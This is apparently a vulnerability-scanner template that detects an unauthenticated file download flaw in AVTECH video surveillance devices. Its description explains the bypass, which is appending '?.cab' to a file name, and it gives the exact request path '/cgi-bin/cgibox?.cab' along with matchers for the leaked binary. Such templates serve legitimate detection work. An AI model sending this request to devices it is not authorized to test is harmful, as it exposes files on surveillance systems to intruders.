id: "avtech-unauth-file-download"
name: "AVTECH Video Surveillance Product - Unauthenticated File Download"
severity: "high"
description: "AVTECH video surveillance products unauthenticated file download from web root through /cgi-bin/cgibox, Since the .cab string is verified by the strstr method, the file download can be realized by adding ?.cab at the end of the file name."
tech:
  - "avtech"
tags:
  - "exposure"
  - "avtech"
  - "unauth"
  - "download"
  - "iot"
  - "vuln"
spaExclusion: true
request:
  method: "GET"
  path: "/cgi-bin/cgibox?.cab"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "ELF"
      - "ddns_avtech_final"
    condition: "and"
  - type: "word"
    part: "header"
    words:
      - "text/plain"
  - type: "status"
    status:
      - 200
